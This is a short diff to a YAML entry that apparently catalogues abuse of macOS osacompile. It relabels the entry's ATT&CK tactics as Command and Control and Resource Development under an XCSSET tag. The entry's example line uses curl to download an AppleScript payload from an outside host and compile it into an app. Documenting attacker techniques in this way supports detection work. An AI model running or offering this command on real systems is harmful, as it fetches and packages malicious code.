@@ -8,7 +8,8 @@ example_use_cases:
   description: The following command downloads an applescript payload from getpayload.com and compiles it into an app.
   code: curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app
   tactics:
-  - Discovery
+  - Command and Control
+  - Resource Development
   tags:
   - XCSSET
 paths:
